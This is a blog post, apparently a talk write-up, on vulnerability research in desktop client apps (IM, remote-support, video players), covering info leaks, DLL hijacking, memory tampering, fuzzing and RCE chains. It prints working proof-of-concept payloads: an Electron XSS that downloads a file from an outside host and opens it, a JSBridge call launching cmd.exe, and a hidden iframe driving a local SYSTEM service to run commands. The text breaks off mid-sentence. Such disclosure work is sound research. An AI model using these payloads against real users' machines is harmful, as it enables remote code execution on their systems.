<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1" /> <title>被忽视的暗面：客户端应用漏洞挖掘之旅 · Chen's Blog</title> <meta name="description" content="被忽视的暗面：客户端应用漏洞挖掘之旅"> <meta name="keywords" content="被忽视的暗面：客户端应用漏洞挖掘之旅"> <link rel="icon" href="http://localhost:4000/assets/favicon.png"> <link rel="apple-touch-icon" href="http://localhost:4000/assets/touch-icon.png"> <link rel="stylesheet" href="http://localhost:4000/assets/core.css"> <link rel="canonical" href="http://localhost:4000/archives/2023-12-18/1"> <link rel="alternate" type="application/atom+xml" title="Chen's Blog" href="http://localhost:4000/feed.xml" /> <link href="/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" media="all" /> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?e4a42a371cc5994ee02b940034c29658"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> </head> <body> <aside class="logo"> <a href="http://localhost:4000/"> <img src="/assets/avatar.jpg" class="logo-avatar"> </a> <span class="logo-prompt code">Back to Index</span> </aside> <article> <h1 class="title">EvilChen</h1> <div class="divider"></div> <center> <a href="https://github.com/gh0stkey" target="_blank">Github</a> | <a href="https://twitter.com/VulkeyChen" target="_blank">X (Twitter)</a> | <a href="/about" target="_blank">About</a> | <a href="/links" target="_blank">Links</a> </center> <div class="divider"></div> </article> <div id="content"> <article> <div class="center"> <h1 class="title">被忽视的暗面：客户端应用漏洞挖掘之旅</h1> <time class="code">December 18, 2023</time> </div> <div class="divider"></div> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&auto=1&id=2106791479&height=66"></iframe> <h1 id="被忽视的暗面客户端应用漏洞挖掘之旅">被忽视的暗面：客户端应用漏洞挖掘之旅</h1> <h2 id="前言">前言</h2> <p>在2023年12月15日，我有幸参加了由“字节跳动安全中心”举办的“安全范儿”沙龙活动。作为“中孚信息元亨实验室”的一员，我被邀请分享名为“被忽视的暗面：客户端应用漏洞挖掘之旅”的技术议题。</p> <p>客户端应用漏洞是许多人在进行漏洞挖掘和安全测试时容易忽视的领域。随着技术的更迭和攻防手段的升级，客户端应用漏洞也逐渐出现在大众视野中（APT攻击、攻防赛事等等），在本次议题中，我们将重点关注PC侧的客户端应用程序，如即时通讯、远程服务、视频软件等应用，探索其中存在的漏洞和潜在的安全风险。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17026451662626.jpg" alt="" /></p> <h2 id="漏洞案例">漏洞案例</h2> <p>漏洞案例的分析主要分为两类，一是常规风险的介绍和了解，二是RCE漏洞的挖掘思路和手法。</p> <p><strong>注意：以下漏洞案例均通过脱敏和细节上的处理。</strong></p> <h3 id="常规风险篇">常规风险篇</h3> <p>常规风险在这里我分为这几类：信息泄露、白利用、逻辑校验、缓冲区溢出。</p> <h4 id="信息泄漏">信息泄漏</h4> <p>对于客户端的信息泄露，我一开始采用的方式就是基于IDA Strings进行敏感的字符串信息匹配，将HaE的规则转为Yara规则再通过FindCrypt3插件进行匹配。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17026453007764.jpg" alt="" /></p> <p>实际效果没有那么好，仅有一些数据库的连接配置信息泄露，并且由于是基于IDA的也没有那么好的进行自动批量化发现。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028731522870.jpg" alt="" /></p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028731780708.jpg" alt="" /></p> <p>我们可以借助<code class="language-plaintext highlighter-rouge">Strings</code>工具来快速的获取可执行文件的字符串内容，并通过正则或其他方式进行匹配。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028736490974.jpg" alt="" /></p> <h4 id="白利用">白利用</h4> <p>白利用问题就老生常谈了，在红队的工作中也经常遇到，如DLL文件没有经过比对导致的劫持问题、带有签名的程序可以通过参数的方式执行任意命令。因此在这里就不过多的赘述了。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028738382826.jpg" alt="" /></p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028738618693.jpg" alt="" /></p> <h4 id="逻辑校验">逻辑校验</h4> <p>很多客户端程序在对用户信息进行获取的时候会通过内存的方式，来获取用户的编号，从而基于此进一步来获取用户的信息。然而这种方式并不是完全可信的，我们可以通过CE来对内存进行修改，从而导致越权漏洞的产生。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028740063948.jpg" alt="" /></p> <p>这类问题很经典，在以往就有许多案例（wooyun-2015-0143395、wooyun-2014-048606），但现在仍然可以从一些主流的应用上发现到类似的安全问题。</p> <h4 id="缓冲区溢出">缓冲区溢出</h4> <p>缓冲区溢出问题太多太多了，我们可以通过通过IDA插件VulFi定位脆弱点，很轻松的在一些客户端应用上找到堆、栈溢出问题。除此之外，也可以通过Boofuzz来对客户端应用开启的本地网络服务进行Fuzz，从而找到溢出问题。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028745014755.jpg" alt="" /></p> <p>除了本地网络服务以外，最经典的、利用最多的还是特定文件格式处理客户端，如常用的Word、Excel。我在实际挖掘的过程中找到了一些图片处理的客户端程序，它用于各种各样的图片处理，我们可以找一些比较不常见的图片格式，并且通过网盘资源找到一些样本文件，丢给GPT或IFFA来分析文件格式，并输出Pits脚本，通过Peach Fuzzer来进行Fuzz工作。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028747262213.jpg" alt="" /></p> <h3 id="rce篇">RCE篇</h3> <p>接着我们来到RCE篇，请注意这里的RCE并不是Pre Auth的，案例中提到的大多需要1 Click进行交互才能利用。但也不是绝对，如果一些客户端的网络服务端口是监听在0.0.0.0的，只要你与目标机器处于同一个网络，或该客户端是在服务器上使用的，也一样可以实现0 Click的效果。</p> <h4 id="web类客户端">Web类客户端</h4> <p>Web类客户端，我的定义是基于HTML、CSS、JS等Web前端技术所构建的客户端应用程序，如Electron这类CEF（浏览器嵌入式）框架开发的客户端应用，以及基于渲染引擎（如Wke）所开发的客户端应用。</p> <h5 id="某im客户端应用">某IM客户端应用</h5> <p>如下图所示，是一个即时通讯客户端应用，我在群名称重命名时发现了一个反射XSS漏洞，根据其目录结构我知道它是一个基于Electron开发的程序。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028753704726.jpg" alt="" /></p> <p>在Electron框架下，如果开发者在渲染页面时配置<code class="language-plaintext highlighter-rouge">nodeIntegration</code>为true，则说明我们可以在前端中使用Nodejs的语法，这就导致我们可以直接在前端使用如下Nodejs代码执行命令：</p><pre><code class="language-nodejs">require('child_process').exec(...);
</code></pre><p>但是这个配置项在创建功能窗口时并没有开启：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/image019.png" alt="" /></p> <p>所以，我们也就没办法通过XSS执行Nodejs的代码，但是根据当前的Electron的版本1.8.7去互联网检索，发现这个版本存在一个历史漏洞：CVE-2018-15685，而后进行相关验证，也无法成功。</p> <p>但是我们在<code class="language-plaintext highlighter-rouge">\resources\app\src\inject\preload.js</code>文件中（这是预加载JS，也就表示这个文件在窗口创建后，页面创建前就执行了），发现了注册的全局变量：</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">ZxDesktop</span> <span class="o">=</span> <span class="nx">ZxDesktop</span><span class="p">;</span>
</code></pre></div></div> <p>所以我们可以直接去调用这个全局变量，从而去使用其内部的定义的一些功能：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028758518853.jpg" alt="" /></p> <p>该全局变量实际上导出了很多其他模块及对应方法：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/image025.png" alt="" /></p> <p>我们跟进File模块，就可以发现存在一个open函数：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/image027.png" alt="" /></p> <p>跟进代码和测试之后，发现它就是文件打开函数，在Console下去调用，成功打开计算器：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/image029.png" alt="" /></p> <p>接着看导出函数列表的其他项，发现存在两个文件保存的方法：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/image031.png" alt="" /></p> <p>而它们所指向的都是另外一个模块的方法：</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">Download</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../download_extra/download.render.js</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div> <p>跟进这个模块，发现实际上他们都来自同一个方法，只不过传递的参数isSelect有不同：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/image033.png" alt="" /></p> <p>接着我们来完整的阅读下代码即可发现整个逻辑，首先根据你传递的参数来判断要调用NormalDownload（正常下载）还是ChunkDownload（分块下载），接着根据isSelect函数来判断调用save还是saveAs方法：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/image035.png" alt="" /></p> <p>所以我们仍然需要跟进NormalDownload或ChunkDownload对应的代码，来查看它们这些方法的逻辑是什么，这里看了之后，两者代码的唯一区别就是分块，所以本文就以NormalDownload的save、saveAs方法去说明。</p> <p>首先是saveAs方法，它会调用一个文件保存框，然后赋值调用retryStart方法：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/image037.png" alt="" /></p> <p>而实际上retryStart方法内调用的是start方法，这个方法是用来进行请求下载的：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/image039.png" alt="" /></p> <p>而后下载的文件实际上会保存在用户的数据目录下，save方法与saveAs方法的最大的不同就是没有这个文件保存框，所以我们当然选择使用save方法。</p> <p>需要注意，在如上代码中save和saveAs的传递参数不一致，其实这不影响最终的处理，因为在一开始的对象创建时候就通过构造函数赋值了：</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">downloader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Download</span><span class="p">(</span><span class="nx">file</span><span class="p">,</span> <span class="nx">config</span><span class="p">);</span>
</code></pre></div></div> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/image041.png" alt="" /></p> <p>至此，我们就获得了文件下载的攻击路径，我们可以根据对应参数这样构建JS代码：</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ZxDesktop</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">File</span><span class="dl">"</span><span class="p">).</span><span class="nx">save</span><span class="p">({</span><span class="dl">"</span><span class="s2">url</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">http://gh0st.cn:81/test.txt</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">test.txt</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">path</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">chunkSize</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">size</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">fileData</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">});</span>
</code></pre></div></div> <p>我们已经获得了文件下载的功能，攻击路径就很明显了：用户下载文件，打开文件。但是实际操作中，我们打开文件还缺少一个路径，并且在实际的测试中，默认情况下，下载的文件是会保存在应用的数据目录的null目录下。</p> <p>而这个目录可能会被用户更改（用户名也没法获取），所以我们需要搭配一个点去获取路径，在这里找到了ZxDesktop的System模块：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/image045.png" alt="" /></p> <p>它的导出列表中有两个属性：dbPath、userDataPath，它们的内容都是一样的，指向了用户的数据目录：</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ZxDesktop</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">System</span><span class="dl">"</span><span class="p">).</span><span class="nx">userDataPath</span>
</code></pre></div></div> <p>我们可以这样拼接，就有了下载文件的目录信息了：</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ZxDesktop</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">System</span><span class="dl">"</span><span class="p">).</span><span class="nx">userDataPath</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/null/test.txt</span><span class="dl">"</span>
</code></pre></div></div> <p>当我们满足所有条件后，就可以构造完整的攻击代码了：</p> <p>1.下载文件：</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">ZxDesktop</span><span class="p">;</span>

<span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">File</span><span class="dl">"</span><span class="p">);</span>

<span class="nx">b</span><span class="p">.</span><span class="nx">save</span><span class="p">({</span><span class="dl">"</span><span class="s2">url</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">http://gh0st.cn:81/test.txt</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">test.txt</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">path</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">chunkSize</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">size</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">fileData</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">});</span>
</code></pre></div></div> <p>2.拼接文件路径，打开文件：</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">b</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">System</span><span class="dl">"</span><span class="p">).</span><span class="nx">userDataPath</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/null/test.txt</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div> <p>3.最终Exploit：</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"&gt;<span class="nt">&lt;svg</span> <span class="na">onload=</span><span class="s">'var a = ZxDesktop;var b = a.require("File");b.save({"url": "http://gh0st.cn:81/test.txt","name": "test.txt","path": "","chunkSize": "","size": "","fileData": ""});b.open(a.require("System").dbPath + "/null/test.txt");'</span><span class="nt">&gt;</span>
</code></pre></div></div> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028761314895.jpg" alt="" /></p> <h5 id="某运维平台客户端">某运维平台客户端</h5> <p>在某运维平台客户端中，我们发现可以通过伪协议链接（<code class="language-plaintext highlighter-rouge">xxx://webview/?url=http://xxxx</code>）来达到端内任意页面加载，这也就表示我们可以执行任意JS代码。</p> <p>根据加载的DLL文件得知，其所依赖的前端页面渲染是开源项目<a href="https://github.com/cexer/wke">Wke</a>。</p> <p>在源代码<code class="language-plaintext highlighter-rouge">wke/jsBind.cpp</code>中，发现wkeJSBindFunction方法提供了JSBridge的功能，将JavaScript函数绑定到C++中一个本地函数。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028764422964.jpg" alt="" /></p> <p>基于IDA分析得知，目标应用使用了该方法将JS函数与C++函数进行了绑定。图下图所示，其将C++某个函数地址，与名为callprogram的JavaScript函数进行绑定，我们可以直接在JS代码中调用。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028765186722.jpg" alt="" /></p> <p>跟进对应的C++函数，我们发现它会通过wkeJSParam获取参数，再通过JSToTempStringW获取字符串形式的参数值，最终将两个参数带入ShellExecuteW函数执行。即最终执行的代码为：<code class="language-plaintext highlighter-rouge">ShellExecuteW(0, "open", 参数1, 参数2, 0, 1)</code>。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028765625148.jpg" alt="" /></p> <p>因此我们可以构建如下的Exploit代码，并通过伪协议的方式使目标可以打开包含Exp代码的网页：</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;callprogram("C:/Windows/System32/cmd.exe", "/c calc");&lt;/script&gt;
</code></pre></div></div> <h4 id="传统类客户端">传统类客户端</h4> <p>传统类客户端，我的定义是基于C/C++写的一些传统应用，如VPN客户端、视频软件、远程控制软件等偏生活、日常类的应用。</p> <h5 id="某远程服务平台客户端">某远程服务平台客户端</h5> <p>在拿到一个客户端程序时，第一步是安装，第二步则应该是先大致去了解该程序的一些目录结构、运行环境等信息，这样我们在接下来的漏洞挖掘中才会有更多的信息来进行关联，辅助我们挖掘漏洞。</p> <p>如下图所示，安装完某远程服务平台客户端后，我通过火绒剑逐个查看对应的进程信息，在TCP/IP窗口中看见当前进程的网络通信或监听信息。如下图所示就是<code class="language-plaintext highlighter-rouge">UserClient.exe</code>进程当前的网络通信信息，我们可以看到它在本地监听了两个端口：<code class="language-plaintext highlighter-rouge">38227</code>、<code class="language-plaintext highlighter-rouge">38230</code>。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16679755790172.jpg" alt="" /></p> <p>它的协议都是TCP，我们可以尝试使用HTTP的方式去访问，结果显示<code class="language-plaintext highlighter-rouge">38230</code>端口可以以HTTP协议的方式进行访问。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16679844917231.jpg" alt="" /></p> <p>我们可以选取响应报文中的<code class="language-plaintext highlighter-rouge">bangwo8client</code>字符串在IDA的Strings窗口中进行搜索，通过这样的方式来进行逻辑的回溯。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16679850207168.jpg" alt="" /></p> <p>双击进入字符串所在的<code class="language-plaintext highlighter-rouge">.RDATA</code>节，我们就可以看到该字符串对应的交叉引用，那么接下来我们的工作就是<strong>进入这些函数看具体实现是否对的上响应报文的主体内容</strong>。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16680597537856.jpg" alt="" /></p> <p>我们进入一个函数查看，会发现在函数的头部代码中有如下这么一段内容，它的逻辑似乎就对应了HTTP响应报文的主体返回，通过字符串的对应我们能大致知道<code class="language-plaintext highlighter-rouge">sub_487760</code>函数的作用就是为了将字符串解析到JSON格式中，然后再通过其他函数拼接JSON的字段内容给到<code class="language-plaintext highlighter-rouge">Block</code>。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16680633669819.jpg" alt="" /></p> <p>除了我们跟进的这个函数外其他的函数逻辑都大致一样，并且我们通过IDA插件<code class="language-plaintext highlighter-rouge">CTO</code>查看调用关系，发现这些函数最终都是被同一个函数<code class="language-plaintext highlighter-rouge">sub_674090</code>调用。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16680636918960.jpg" alt="" /></p> <p>那我们再继续跟进函数<code class="language-plaintext highlighter-rouge">sub_674090</code>，函数的逻辑就是根据不同的URI进入不同的函数处理，也就表示着这里就是HTTP请求逻辑处理的入口位置。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16680638567124.jpg" alt="" /></p> <p>有了请求处理逻辑的入口，接下来我们就要去看每个URI对应的处理逻辑是什么，看一下处理的逻辑中是否有参数值可控导致存在的相关漏洞。</p> <p>如果你觉得这样去看很累，也可以基于敏感函数的调用链来对应每个URI的处理函数，如下图所示我就基于<code class="language-plaintext highlighter-rouge">ShellExecuteA</code>函数的调用链找到了URI<code class="language-plaintext highlighter-rouge">/api_install</code>的对应处理函数，也就表示当你访问URL：<code class="language-plaintext highlighter-rouge">http://127.0.0.1:38230/api_install</code>时很有可能就会触发<code class="language-plaintext highlighter-rouge">ShellExecuteA</code>函数。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16680696654183.jpg" alt="" /></p> <p>那么我们可以跟进去看一下该处理函数，看看是否可以将可控参数值带入到<code class="language-plaintext highlighter-rouge">ShellExecuteA</code>函数里去执行。</p> <p>在函数的一开始就判断运行当前程序的用户是否是<code class="language-plaintext highlighter-rouge">system</code>，如果不是的话则直接返回响应内容（状态码500）提示当前不是以SYSTEM权限运行的进程。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16680699571630.jpg" alt="" /></p> <p>这里我们通过Process Hacker可以看到<code class="language-plaintext highlighter-rouge">UserClient.exe</code>进程对应的用户就是<code class="language-plaintext highlighter-rouge">SYSTEM</code>：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16680700889509.jpg" alt="" /></p> <p>也就表示我们当前是满足这个条件的，所以可以接着看IF分支内的逻辑。在IF分支内就执行了<code class="language-plaintext highlighter-rouge">ShellExecuteA</code>函数，根据<code class="language-plaintext highlighter-rouge">ShellExecuteA</code>函数的使用语法我们知道它这是以<code class="language-plaintext highlighter-rouge">v15</code>作为参数执行<code class="language-plaintext highlighter-rouge">v16</code>程序，所以我们需要知道<code class="language-plaintext highlighter-rouge">v15</code>、<code class="language-plaintext highlighter-rouge">v16</code>这两个变量是如何赋值而来的。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16680708970258.jpg" alt="" /></p> <p>具体的逻辑可以下图，我们找到赋值关系最终确认一切的参数来源都是<code class="language-plaintext highlighter-rouge">Block</code>，该值是一个全局变量，那么根据当前的环境我们就可以猜测此处的来源就是HTTP请求参数。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16680711304718.jpg" alt="" /></p> <p>根据猜测，我们可以先使用OD附加进程在<code class="language-plaintext highlighter-rouge">ShellExecuteA</code>函数处下断点。</p> <p>然后请求URL：<code class="language-plaintext highlighter-rouge">http://127.0.0.1:38230/api_install?file=cmd.exe&amp;param=/k%20notepad</code>，我们就会在OD界面中看见端点到<code class="language-plaintext highlighter-rouge">ShellExecuteA</code>函数了，我们可以通过栈来看一下传参是什么。</p> <p>如下所示我们发现<code class="language-plaintext highlighter-rouge">ShellExecuteA</code>函数的参数<code class="language-plaintext highlighter-rouge">FileName</code>和<code class="language-plaintext highlighter-rouge">Parameters</code>是一串乱码的内容，这应该是我们输入的字符串经过了某些处理后导致的。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16681317190938.jpg" alt="" /></p> <p>因此我们可以在URI<code class="language-plaintext highlighter-rouge">/api_install</code>对应处理的函数起始位置下断点一步一步跟进看一下我们请求的参数值是否真的带进来了，如果带进来了为什么最终值会变成一段乱码的数据。</p> <p>如下图OD中可以看见我们的请求参数<code class="language-plaintext highlighter-rouge">file</code>的值<code class="language-plaintext highlighter-rouge">cmd.exe</code>确实可以带进来，这也就验证了我们的猜想，<code class="language-plaintext highlighter-rouge">ShellExecuteA</code>函数的参数是来源于HTTP请求参数。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16681356708499.jpg" alt="" /></p> <p>接着走下去我们会发现调用如下函数时的参数就是我们的请求参数<code class="language-plaintext highlighter-rouge">file</code>和对应值<code class="language-plaintext highlighter-rouge">cmd.exe</code>，当该函数执行完成之后返回到EAX寄存器，我们跟进EAX寄存器的地址查看数据就会发现数据为乱码内容，也就是我们在<code class="language-plaintext highlighter-rouge">ShellExecuteA</code>函数断点处看见的参数。</p><pre><code class="language-asm">push esi
push eax
call UserClie.004203B0
</code></pre><p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16681358274356.jpg" alt="" /></p> <p>所以我们可以跟进函数<code class="language-plaintext highlighter-rouge">004203B0</code>在IDA中看一下它具体做了什么，这样我们才能构造请求让真正的字符串带入到<code class="language-plaintext highlighter-rouge">ShellExecuteA</code>函数中执行。</p> <p>在这之前我们需要注意，由于IDA和实际进程执行的基址不同，我们可以在OD中找到进程基址然后将IDA对应的基址修改为进程的，这样我们就可以直接跟进函数<code class="language-plaintext highlighter-rouge">004203B0</code>，而不需要再去进行地址的换算。</p> <p>在IDA中跟进函数<code class="language-plaintext highlighter-rouge">004203B0</code>，它实际上也是调用的另外一个函数<code class="language-plaintext highlighter-rouge">00370C70</code>，在该函数里对字符串进行位移转换，猜测可能是自定义的解码方式。但是在它进行遍历的过程中使用到了一段数组数据<code class="language-plaintext highlighter-rouge">word_74E940</code>，我们跟进这个数据之后发现似乎是一张解码表。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16681457115844.jpg" alt="" /></p> <p>如下将整段数据罗列出来，看着与Base64解码所需要的解码表是一致的，所以此处极有可能就是Base64解码操作，将我们的输入的字符串<code class="language-plaintext highlighter-rouge">cmd.exe</code>进行解码，最终就变成了乱码。</p> <p>我们可以将<code class="language-plaintext highlighter-rouge">cmd.exe</code>字符串进行Base64解码，发现结果确实为我们之前所看到的乱码内容：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16681461174700.jpg" alt="" /></p> <p>最终我们也就确定了这里的请求参数值是需要先进行Base64编码之后再带入请求的。因此我们可以构建出如下Exploit，当安装了该客户端的应用打开Exp代码对应页面时，即可以执行我们想要的命令。</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://127.0.0.1:38230/api_install?file=Y21kLmV4ZQ==&amp;param=L2sgbm90ZXBhZA=="</span> <span class="na">width=</span><span class="s">"0px"</span> <span class="na">height=</span><span class="s">"0px"</span><span class="nt">&gt;</span>
</code></pre></div></div> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028770589143.jpg" alt="" /></p> <h5 id="某视频软件客户端">某视频软件客户端</h5> <p>通过URLProtocolView找到视频软件客户端注册的伪协议：<code class="language-plaintext highlighter-rouge">xxplayer://</code>，通过字符串定位程序伪协议的处理功能点，也可以知道有哪些的伪协议路由。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028774570110.jpg" alt="" /></p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028774924444.jpg" alt="" /></p> <p>发现这里可以通过<code class="language-plaintext highlighter-rouge">xxplayer://action.cmd/xxx</code>的方式来触发一些功能，所有功能列表如下所示：</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xxplayer://action.cmd/playShareVideo
xxplayer://action.cmd/play
xxplayer://action.cmd/downloadvideo
xxplayer://action.cmd/downloadpage
xxplayer://action.cmd/downloadShareVideo
xxplayer://action.cmd/createshortcut_url
xxplayer://action.cmd/createshortcut
xxplayer://action.cmd/activeHomepage
</code></pre></div></div> <p>根据字面意思理解它的作用即可，这里我们一个一个带入请求尝试，发现当请求<code class="language-plaintext highlighter-rouge">createshortcut_url</code>时会在桌面创建<code class="language-plaintext highlighter-rouge">.link</code>的快捷方式文件。</p> <p>我们跟进这个创建快捷方式的逻辑，发现实际上它还有两个参数：<code class="language-plaintext highlighter-rouge">url</code>、<code class="language-plaintext highlighter-rouge">name</code>：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16756111480279.jpg" alt="" /></p> <p>然后将这两个参数值带入<code class="language-plaintext highlighter-rouge">CreateUrlShortcut</code>函数执行，这个函数是导入函数，就是用于创建桌面快捷方式的。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/16756112003388.jpg" alt="" /></p> <p>因此我们可以构建伪协议URL：<code class="language-plaintext highlighter-rouge">xxplayer://action.cmd/createshortcut_url?url=http://www.baidu.com&amp;name=Test</code>，访问就发现它创建了一个名为<code class="language-plaintext highlighter-rouge">Test</code>的快捷方式，目标为：<code class="language-plaintext highlighter-rouge">C:\xxplayer.exe \UrlQuickLunch=http://www.baidu.com,0</code>，也就表示我们传入的<code class="language-plaintext highlighter-rouge">url</code>参数值变成了启动参数，<code class="language-plaintext highlighter-rouge">name</code>参数值变成了快捷方式名字。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2023-12-18/17028772674438.jpg" alt="" /></p> <p>当我们双击这个快捷方式时，就会调用浏览器打开<code 